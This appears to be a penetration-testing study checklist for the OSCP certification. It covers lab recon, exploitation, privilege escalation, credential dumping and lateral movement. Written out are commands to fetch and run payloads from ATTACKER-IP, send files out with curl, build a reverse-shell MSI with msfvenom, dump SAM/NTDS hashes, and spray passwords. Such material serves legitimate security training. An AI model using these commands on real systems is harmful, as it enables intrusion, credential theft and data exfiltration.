> Credit: 
> https://github.com/intotheewild/OSCP-Checklist
> https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html
> https://wadcoms.github.io/
> https://book.hacktricks.xyz
> https://swisskyrepo.github.io/InternalAllTheThings/
> https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html

[[#Note Structure]]
[[#Tips and Tricks]]
[[#Stuck?]]
[[#Reconnaissance]]
[[#Exploitation]]
[[#Privilege Escalation]]
[[#Post-Exploitation]]
[[#Lateral Movement]]

# [Practice](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)

1. OSCP Labs
2. Proving Grounds Practice
3. Proving Grounds Play
4. Hack The Box

# Note Structure

## Kali Box

```bash
OSCP/
├── users.txt
├── passwords.txt
├── ntlm.txt
├── hosts.txt
└── exploits/
└── recon/
    ├── autorecon
    └── nmap
```

## [Obsidian](https://obsidian.md/) (for box notes)

```bash
Obsidian/
└── 192.168.1.1/
    └── report/
        ├── local.md
        ├── proof.md
        ├── notes.md
        └── screenshots/
└── 192.168.1.2/
    └── report/
        ├── local.md
        ├── proof.md
        ├── notes.md
        └── screenshots/
...
```

# Tips and Tricks

## Staging & payload transfer

[Python3 HTTP server with file upload capabilities](https://github.com/tjnull/OSCP-Stuff/blob/master/Transferring-Files/HTTPServerWithUpload.py)

```shell
# Staging
$attacker > mkdir /home/kali/staging && cd $_
$attacker > python3 -m http.server
$attacker > sudo impacket-smbserver STAGING /home/kali/staging
$attacker > sudo wsgidav --port=80 --host=0.0.0.0 --root=/home/kali/staging --auth=anonymous
$attacker > sudo python3 -m pyftpdlib -p 21 -w

# VICTIM(Windows)->ATTACKER
$victim > net use x: \\ATTACKER-IP\STAGING
$victim > cp <file> x:\<file>

# ATTACKER->VICTIM(Windows)
$victim > iwr -useb http://ATTACKER-IP:8000/file.exe -OutFile .\file.exe
$victim > iwr -useb http://ATTACKER-IP/file.ps1 | iex
$victim > certutil.exe -urlcache -f http://ATTACKER-IP/bad.exe bad.exe

$victim > net use use x: \\ATTACKER-IP\STAGING
$victim > cp x:\<file> <file>

# VICTIM(Linux)->ATTACKER
$victim > curl -XPOST -F "file=@example.txt" http://ATTACKER-IP:8000

# ATTACKER->VICTIM(Linux)
$victim > wget http://ATTACKER-IP:8000/file.sh
$victim > wget http://ATTACKER-IP:80/file.elf
$victim > curl http://ATTACKER-IP:8000/file2.sh -o file2.sh
```

## Upgrading basic reverse shell to interactive shell

```shell
# Upgrade to interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'

# [CTRL+Z]

stty raw -echo && fg
export SHELL=/bin/bash; export TERM=screen; reset;
```

## Tunneling via [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)

No more proxychains! Take note of known [caveats](https://github.com/nicocha30/ligolo-ng)

```shell
$attacker > sudo apt install ligolo-ng
$attacker > sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443
$attacker > interface_create --name "ligolo"

$victim > iwr -useb http://ATTCKER-IP:8080/agent.exe -OutFile .\agent.exe
$victim > .\agent.exe -connect ATTACKER-IP:443 -ignore-cert

# Then, find the internal subnet and add the route to ligolo
$attacker > tunnel_start --tun "ligolo"
$attacker > interface_add_route --name "ligolo" --route 172.31.32.0/20

# For local port forwarding
$attacker > interface_add_route --name "ligolo" --route 240.0.0.1/32
```

![[ligolo.png]]

## Command logging

Log ran commands to aide in the report-writing. 

```bash
nano ~/.zshrc
export HISTFILE=./commands_ran.txt
source ~/.zshrc
```
# Stuck?

1. Start from the top of the checklist again. Enumerate the network to death.
2. Found a service you've never used? Identify the version, find vulnerabilities, try default credentials
3. Try `username:username` as credentials
4. Try dumb credentials (`admin:admin`, `administrator:password`, etc)
5. Can't crack a hash? Try adding rules like `best64`
# Reconnaissance 

> GOAL: Identify live hosts and enumerate services to identify attack surface

1. `mkdir machine && cd $_`
2. We're given the hosts, so no need to ping sweep or anything. Add to `hosts.txt`
# Enumeration

1. Identify services via nmap: `nmap --min-rate 4500 --max-rtt-timeout 1500ms -sC -sV -Pn -O -p- -iL ../../hosts.txt -oA nmap_full` 
2. Enumerate services via AutoRecon:  `autorecon -t ../hosts.txt --nmap-append "--min-rate 4500 --max-rtt-timeout 1500ms" -vv`
3. Enumerate services via Incursore: `sudo incursore.sh -t all -H 192.168.1.1`

## AD Assume Breach

1. Get access to the DC via tunneling (ie: ligolo)
2. Add `domain.lab` to `/etc/hosts` 
3. Prep for BloodHound: `bloodhound-python -u 'username' -p 'password' -d domain.lab -dc domain.lab -ns DC-IP -c All --zip`
4. Dump domain LDAP: `ldapdomaindump -u 'username' -p 'password' -r -n DC-IP domain.lab`
5. List shares: `smbmap -u 'username' -p 'password' -H 192.168.1.1`
6. RID brute: `nxc smb 192.168.1.1 -u 'username' -p 'password' --rid-brute`

## Note Taking

| Host          | Hostname | OS                  | Port | Service                                | Notes |
| ------------- | -------- | ------------------- | ---- | -------------------------------------- | ----- |
| 192.168.1.101 | DC       | Windows Server 2012 | 22   | OpenSSH for_Windows_8.1 (protocol 2.0) |       |
|               |          |                     | 21   | vsftpd 2.0.8 or later                  |       |
|               |          |                     | 3389 |                                        |       |
| 192.168.1.102 | MAIL     | Windows Server 2012 | 25   |                                        |       |
|               |          |                     |      |                                        |       |
# Exploitation

> GOAL: Exploit identified services and gain initial foothold as low-privileged user

## What to look for

1. Look at service versions and try to identify public exploits (ie: `searchsploit` or "Apache 2.2.2.2 CVE")
2. Look for web forms (file uploads, contact forms, etc.)
3. Check if there's any files that give contextual hints or point towards a vulnerable service running on an unknown port

## FTP

1. Check version for known vulnerabilities (authn bypass, RCE, etc.)
2. Check for anonymous login
```
ftp 192.168.1.1
anonymous
anonymous

wget -m ftp://anonymous:anonymous@192.168.1.1
```

## HTTP

1. Check version for known vulnerabilities (path traversal, RCE, etc.)
2. Check what technology the website is running [`whatweb http://192.168.1.1`](https://www.kali.org/tools/whatweb/)
3. If running a CMS, test default and/or weak credentials
4. Try to find hints at FQDN and put it in `/etc/hosts`
5. Try to find hints at users and/or passwords of the system(s)
	1. Run `CeWL`/`CeWLeR` to get candidates to add to `passwords.txt`
6. Fuzz harder
	1. Directory Enumeration: `feroxbuster -u http://192.168.1.1 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`
	2. Subdomain Enumeration: `ffuf -H "Host: FUZZ.$DOMAIN" -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.1.1`
## SNMP

1. Enumerate community strings `sudo nmap -sU -p 161 --script snmp-brute 192.168.1.1`
2. Enumerate MIB `snmpbulkwalk -c public -v2c 192.168.1.1 . | tee out.snmp`
3. `grep -i password out.snmp`, etc.
4. Brute SNMP https://github.com/dheiland-r7/snmp

## RDP

1. Check version for known vulnerabilities

## SMB

1. Check version for known vulnerabilities `nmap --script smb-vuln* -p 139,445 192.168.1.1`
2. Check for anonymous login `smbmap -H 192.168.1.1` and `smbclient -L \\\\192.168.1.1`
3. Check for RPC `rpcclient -U "" -N 192.168.1.1` ([HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration))

# Privilege Escalation

> GOAL: With initial foothold, let's escalate from service->user->root

## Windows

Quick Wins:
1. [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
2. [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)


1. Check token privileges for SeImpersonatePrivilege `whoami /priv` 
	1. Use PrintSpoofer or GodPotato
2. Check AlwaysInstallElevated Registry
	1. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` => `0x1`
	2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_ip LPORT=LOCAL_PORT -f msi -o malicious.msi`
	3. `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`
3. Check for cached credentials `cmdkey /list`
4. Check PowerShell history
	1. `Get-History`
	2. `(Get-PSReadlineOption).HistorySavePath`
	3. `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
5. Check running services for Unquoted or Non-default locations 
	1. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
6. Check for non-default binaries looking for .dll files (like log files too) 
	1. `C:\TEMP\???`, `C:\Users\user\???`, `C:\backup\???`
7. Check for useful files
	1. `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
	2. `Get-ChildItem -Path C:\ -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
8. Check for scheduled tasks run by higher level `schtasks /query /fo LIST /v`
9. Check installed packages (maybe has vuln?)
	1. `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	2. `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

## Linux

Quick Wins:
1. [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
2. [LinEnum](https://github.com/rebootuser/LinEnum)

1. Sudo binaries via `sudo -l` and [GTFOBins](https://gtfobins.github.io/)
2. Vulnerable sudo versions via `sudo -V`
3. SUID binaries `find / -perm -u=s -type f 2>/dev/null` and [GTFOBins](https://gtfobins.github.io/)
4. SGID binaries `find / -perm -g=s -type f 2>/dev/null`
5. Check for vulnerable kernel versions `uname -a`
6. Check for incorrect file permissions
	1. Writable `/etc/passwd`, `/etc/shadow`, etc
7. Check cronjobs for jobs we can abuse
	1. `ls -lah /etc/cron*`
	2. `cat /var/log/syslog | grep cron`
	3. `cat /var/log/cron.log`

# Post-Exploitation

> GOAL: Gain more information to aide with lateral movement.

1. Dump credentials (local creds, cached credentials, domain creds) using `impacket-secretsdump`, `sekurlsa::logonpasswords`, and `lsadump::sam` 
```shell
# Non-domain joined
$victim > reg save HKLM\SAM SAM
$victim > reg save HKLM\SYSTEM SYSTEM
$attacker > impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Domain joined
$victim > reg save HKLM\SAM SAM
$victim > reg save HKLM\SECURITY SECURITY
$victim > reg save HKLM\SYSTEM SYSTEM
$attacker > impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# Domain controller
$victim > reg save HKLM\SECURITY SECURITY
$victim > reg save HKLM\SYSTEM SYSTEM
$victim > powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
$attacker > impacket-secretsdump -ntds NTDS.DIT -security SECURITY -system SYSTEM LOCAL
```
2. Try to crack hashes with Crackstation & hashcat
	1. Example LM: `aad3b435b51404ee`
	2. Example NT: `7d3f11711c610f013c06959a5e98f2fd`
	3. Example MsCashv2: `$DCC2$10240#username#hash`
	4. Unknown hash? Try [HashID](https://pypi.org/project/hashID/) `hashid 7d3f11711c610f013c06959a5e98f2fd`
```shell
# aad3b435b51404eeaad3b435b51404ee = Null LM hash
# 31d6cfe0d16ae931b73c59d7e0c089c0 = Null NT hash

# LM -> OphCrack Rainbow Tables

# NT
hashcat -a 0 -m 1000 hashes /usr/share/wordlists/rockyou.txt

# MsCashv2:
hashcat -a 0 -m 2100 hashes /usr/share/wordlists/rockyou.txt
```
3. Add cracked passwords to `passwords.txt` for further use in spraying & lateral movement
4. If you can't crack a hash, utilize Pass-The-Hash [[#Lateral Movement]]

# Lateral Movement

> GOAL: Try known credentials across other systems in the network.

1. Password & hash spray via hydra or medusa
```bash
hydra -L users.txt -P passwords.txt -M hosts.txt ssh
hydra -L users.txt -P passwords.txt -M hosts.txt ftp

medusa -U users.txt -P passwords.txt -H hosts.txt -M ssh
medusa -U users.txt -P passwords.txt -H hosts.txt -M ftp

netexec smb hosts.txt -u users.txt -H hashes.txt --continue-on-success
netexec smb hosts.txt -u users.txt -p passwords.txt --continue-on-success
# Try other protocols like winrm, rdp, wmi
```
2. Pivot via `smbexec`, `psexec`, `wmiexec`, `evil-winrm`, etc.











